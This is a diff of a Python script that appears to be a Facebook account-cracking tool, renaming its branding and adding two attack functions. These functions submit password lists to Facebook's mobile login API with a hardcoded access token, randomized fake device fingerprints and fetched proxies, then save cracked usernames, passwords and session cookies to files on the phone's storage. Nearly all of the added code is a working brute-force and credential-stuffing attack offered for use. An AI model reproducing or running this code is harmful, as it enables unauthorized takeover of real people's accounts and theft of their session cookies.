@@ -11,7 +11,7 @@ try:
 except ModuleNotFoundError: 
     print('\n Installing missing modules ...')
     os.system('pip install requests bs4 futures==2 > /dev/null')
-    os.system('python SAMBA.py')
+    os.system('python ZAIN.py')
 	
 #os.system('xdg-open https://chat.whatsapp.com/Jv6uZwbW5so4zCQml49xBA')
 
@@ -19,7 +19,7 @@ try:
     prox= requests.get('https://raw.githubusercontent.com/trt-Fire/data/main/proxies.txt').text
     open('proxies.txt','w').write(proxies)
 except Exception as e:
-    print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')
+    print('\x1b[1;92m[âˆڑ] PLEASE WAIT CHECKING UPDATE...')
 	
 proxies=open('proxies.txt','r').read().splitlines()
 
@@ -281,7 +281,7 @@ def menu():
                                 print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
                                 input(' PRESS ENTER TO BACK ')
-                                os.system('python ZAIN.py')
+                                os.system('python AMIN7x.py')
                         elif xd in ['2','02']:
                                 pak()
                         elif xd in ['3','03']:
@@ -320,12 +320,12 @@ def pak():
                 print(' TOTAL OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
                 input(' PRESS ENTER TO BACK ')
-                os.system('python AMIN.py')
+                os.system('python ZAIN.py')
 #------
 def ffb(ids,names,passlist):
         try:
                 global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [ZAINI] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                sys.stdout.write('\r\r\033[1;37m [AMIN] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -374,11 +374,11 @@ def ffb(ids,names,passlist):
                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print('\r\r\033[1;32m [ZAINI-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        print('\r\r\033[1;32m [AMIN-OK] '+ids+' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/ZAINI-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/ZAINI-OK.txt','a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/AMIN-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/AMIN-OK.txt','a').write(ids+'|'+pas+'\n')
                                         oks.append(ids)
                                         break
                         elif twf in str(po):
@@ -388,12 +388,12 @@ def ffb(ids,names,passlist):
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [ZAINI-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ZAINI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;31m [AMIN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/AMIN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                                         else:
-                                                open('/sdcard/ZAINI-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/AMIN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
                         else:
@@ -503,12 +503,12 @@ def api(ids,names,passlist):
                                         break
                         elif twf in str(po):
                                         if 'y' in pcp:
-                                                print('\r\r \033[1;34m[AMIN] '+ids+' | '+pas)
+                                                print('\r\r \033[1;34m[AMIN-2F] '+ids+' | '+pas)
                                                 twf.append(ids)
                                                 break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;31m [AMIN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                                print('\r\r\x1b[1;31m [ZAINI-CP] '+ids+' | '+pas+'\033[1;97m')
                                                 open('/sdcard/AMIN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                                 cps.append(ids)
@@ -528,4 +528,204 @@ def api1(ids,names,passlist):
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.r
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/;FBBV/;[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/20748104;FBDM({density=1.0,width=600,height=976};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/com.facebook.katana;FBDV/K5-3G;FBSV/5.1.1;nullFBCA/x86:armeabi-v7a;]"
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sm=['GT-', 'SM-']
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid':adid,
+                                'format':'json',
+                                'device_id':device_id,
+                                'email':ids,
+                                'password':pas,
+                                'generate_analytics_claims':'1',
+                                'credentials_type':'password',
+                                'source':'login',
+                                'error_detail_type':'button_with_disabled',
+                                'enroll_misauth':'false',
+                                'generate_session_cookies':'1',
+                                'generate_machine_id':'1',
+                                'fb_api_req_friendly_name':'authenticate',
+                        }
+                        headers={
+                                'Authorization':f'OAuth {accessToken}',
+                                'X-FB-Friendly-Name':'authenticate',
+                                'X-FB-Connection-Type':'unknown',
+                                'User-Agent':AMIN_UA(),
+                                'Accept-Encoding':'gzip, deflate',
+                                'Content-Type': 'application/x-www-form-urlencoded',
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                try:
+                                        uid = po['uid']
+                                except:
+                                        uid = ids
+                                if str(uid) in oks:
+                                        break
+                                else:
+                                        print('\r\r\033[1;32m [AMIN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        #print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/AMIN-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/AMIN-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                try:
+                                        uid = po['error']['error_data']['uid']
+                                except:
+                                        uid = ids
+                                if uid in oks:pass
+                                else:
+                                    #    print('\r\r\x1b[1;31m [ZAINI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AMIN-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        cps.append(str(ids))
+                                        break
+                        else:continue
+                loop+=1
+        except Exception as e:
+                pass
+                        
+def rndm(ids,passlist):
+        global loop
+        global oks
+        sys.stdout.write('\r\r\033[1;37m [AMIN] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        try:
+                for pas in passlist:
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+                        fbbv = str(random.randint(111111111,999999999))
+                        android_version = device['android_version']
+                        model = device['model']
+                        build = device['build']
+                        fblc = device['fblc']
+                        fbcr = sim_id
+                        fbmf = device['fbmf']
+                        fbbd = device['fbbd']
+                        fbdv = device['fbdv']
+                        fbsv = device['fbsv']
+                        fbca = device['fbca']
+                        fbdm = device['fbdm']
+                        fbfw = '1'
+                        fbrv = '0'
+                        fban = 'FB4A'
+                        fbpn = 'com.facebook.katana'
+                        en = random.choice(['en_US','en_GB'])
+                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
+                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
+                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
+                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
+                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
+                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
+                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
+                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
+                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";FBBV/2282831;FBDM/{density=3.4,width=1391,height=1609};FBLC/en_US;FBRV/774005469;FBCR/Mobilink;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.mlite;FBDV/Samsung;FBSV/17;FBOP/5;FBCA/x86:armeabi-v7a;]"
+                        random_seed = random.Random()
+                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+                        device_id = str(uuid.uuid4())
+                        secure = str(uuid.uuid4())
+                        family = str(uuid.uuid4())
+                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
+                        sm=['GT-', 'SM-']
+                        sim_serials = f'["{xd}"]'
+                        li = ['28','29','210']
+                        li2 = random.choice(li)
+                        j1 = ''.join(random.choice(digits) for _ in range(2))
+                        jazoest = li2+j1
+                        data = {
+                                'adid': adid,
+                                'format': 'json', 
+                                'device_id': device_id,
+                                'email': ids, 
+                                'password': pas, 
+                                'generate_analytics_claims': '1', 
+                                'credentials_type': 'password', 
+                                'source': 'login', 
+                                'error_detail_type': 
+                                'button_with_disabled', 
+                                'enroll_misauth': 'false', 
+                                'generate_session_cookies': '1',
+                                'generate_machine_id': '1', 
+                                'locale': 'fa_AF', 'client_country_code': 'AF',
+                                'fb_api_req_friendly_name': 'authenticate'}
+                        headers={
+                                'User-Agent':AMIN_UA(),
+                                'Accept-Encoding': 'gzip, deflate', 
+                                'Accept': '*/*', 
+                                'Connection': 'keep-alive', 
+                                'Authorization':f'OAuth {accessToken}', 
+                                'X-FB-Friendly-Name': 'authenticate', 
+                                'X-FB-Connection-Type': 'unknown', 
+                                'Content-Type': 'application/x-www-form-urlencoded', 
+                                'X-FB-HTTP-Engine': 'Liger'
+                                }
+                        url = 'https://b-graph.facebook.com/auth/login'
+                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
+                        po = requests.post(url,data=data,headers=headers).json()
+                        if 'session_key' in po:
+                                try:
+                                        uid = po['uid']
+                                except:
+                                        uid = ids
+                                if str(uid) in oks:
+                                        break
+                                else:
+                                        print('\r\r\033[1;32m [AMIN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                                        print("\r\r\033[1;33m Cookie: "+coki)
+                                        open('/sdcard/AMIN-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
+                                        open('/sdcard/AMIN-OK.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        oks.append(str(uid))
+                                        break
+                        elif 'www.facebook.com' in po['error']['message']:
+                                try:
+                                        uid = po['error']['error_data']['uid']
+                                except:
+                                        uid = ids
+                                if uid in oks:pass
+                                else:
+                                    #    print('\r\r\x1b[1;31m [ZAINI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/AMIN-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                                        cps.append(str(ids))
+                                        break
+                        else:continue
+                loop+=1
+        except Exception as e:
+                pass
+
+menu()
